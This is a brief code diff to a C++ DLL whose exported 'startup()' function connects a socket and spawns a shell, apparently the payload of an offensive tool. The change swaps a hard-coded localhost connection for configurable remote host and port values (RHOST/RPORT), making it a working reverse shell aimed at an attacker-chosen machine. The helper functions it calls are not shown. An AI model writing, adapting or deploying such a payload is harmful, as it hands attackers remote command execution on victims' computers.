@@ -1,8 +1,9 @@
 #include "../core/external.h"
+#include "../config.h"
 
 extern "C" __declspec(dllexport) void startup()
 {
-    SockConnect("localhost", "1234");
+    SockConnect(RHOST, RPORT);
     SockShell();
     ExitThread(0);
 }
